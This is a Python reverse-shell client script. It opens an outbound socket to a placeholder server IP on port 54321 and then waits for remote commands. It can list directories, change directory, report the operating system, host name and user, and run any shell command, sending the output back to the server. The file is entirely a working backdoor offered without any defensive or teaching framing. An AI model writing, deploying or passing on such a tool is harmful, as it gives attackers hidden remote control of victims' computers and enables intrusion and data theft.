#!/usr/bin/python
import socket
import subprocess
import os
import json
import platform
import getpass
import time
def reliable_send(data):
    json_data = json.dumps(data)
    sock.send(json_data.encode())  # Encode the data to bytes before sending

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + sock.recv(4096).decode("utf-8")  # Adjust buffer size
            if len(data) > 0:
                return data.strip()  # Return the received data
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()  # Receive command from server
        if command == 'q':  # Exit condition for the shell
            break
        elif command == "list":
            # List files in the current directory and send back as a string
            try:
                file_list = "\n".join(os.listdir("."))
                sock.send(file_list.encode())
            except Exception as e:
                sock.send(f"Error listing directory: {e}".encode())
        elif command.split(" ")[0] == "cd":
            # Change directory
            try:
                dir_path = command.split(" ")[1]
                os.chdir(dir_path)
                sock.send(f"Changed directory to {os.getcwd()}".encode())
            except IndexError:
                sock.send("Error: No directory specified.".encode())
            except FileNotFoundError:
                sock.send(f"Error: Directory {dir_path} not found.".encode())
            except PermissionError:
                sock.send(f"Error: Permission denied to change to {dir_path}".encode())
        elif command == "sysinfo":
            # Gather system information
            sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
User: {getpass.getuser()}
Release Ver.: {platform.release()}
Processor Arch.: {platform.processor()}
            """
            sock.send(sysinfo.encode())
        else:
            # Execute the command on the client system
            try:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = proc.communicate()  # Use communicate() to capture output

                # Combine stdout and stderr, strip any extra whitespace or newlines
                result = stdout.decode().strip() + stderr.decode().strip()

                # Send the result back to the server
                reliable_send(result)
            except Exception as e:
                sock.send(f"Error executing command: {e}".encode())

# Create and connect the socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('INPUT SERVER IP', 54321))

shell()  # Start the shell interaction

sock.close()  # Close the socket after the shell ends
